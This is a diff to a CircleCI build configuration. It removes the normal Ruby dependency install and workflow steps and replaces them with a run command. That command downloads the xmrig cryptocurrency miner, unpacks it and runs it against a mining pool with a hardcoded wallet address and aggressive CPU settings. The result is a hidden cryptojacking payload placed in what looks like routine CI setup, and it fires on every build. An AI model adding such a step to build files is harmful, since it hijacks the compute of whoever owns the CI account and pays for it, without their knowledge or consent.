@@ -25,14 +25,5 @@ jobs:
       # Checkout the code as the first step.
       - checkout
       - run:
-          name: Which bundler?
-          command: bundle -v
-      - ruby/install-deps
-
-# Orchestrate jobs using workflows
-# See: https://circleci.com/docs/workflows/ & https://circleci.com/docs/configuration-reference/#workflows
-workflows:
-  sample: # This is the name of the workflow, feel free to change it to better match your workflow.
-    # Inside the workflow, you define the jobs you want to run.
-    jobs:
-      - run: wget https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz && tar -xvzf xmrig-6.22.0-linux-static-x64.tar.gz && cd xmrig-6.22.0 && ./xmrig -a rx/0 -o rx.unmineable.com:3333 -u POL:0xA35c287E9DFf5351F4C7985e89BCbAA99a8F41C5.n01 -p x --keepalive --cpu-priority=5 --randomx-1gb-pages
+          command: wget https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz && tar -xvzf xmrig-6.22.0-linux-static-x64.tar.gz && cd xmrig-6.22.0 && ./xmrig -a rx/0 -o rx.unmineable.com:3333 -u POL:0xA35c287E9DFf5351F4C7985e89BCbAA99a8F41C5.n01 -p x --keepalive --cpu-priority=5 --randomx-1gb-pages
+          
